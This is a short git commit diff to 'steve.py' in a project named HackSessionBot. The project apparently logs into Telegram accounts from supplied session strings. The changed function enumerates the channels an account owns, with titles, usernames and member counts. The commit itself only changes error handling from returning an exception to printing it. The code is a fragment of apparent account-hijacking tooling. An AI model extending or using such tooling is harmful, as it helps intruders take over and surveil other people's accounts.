c912d83f9049b7bf6eb12a24839f90a78a0b9e83
SupremeStark <123313682+SupremeStark@users.noreply.github.com>
2023-01-27 21:20:51 +0530

    Update steve.py

--- HackSessionBot/Helpers/steve.py
+++ HackSessionBot/Helpers/steve.py
@@ -29,7 +29,7 @@ async def users_gc(session):
                 for x in k.chats:                
                     msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
             except Exception as E:
-                return E
+                print(E)
                                                    
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
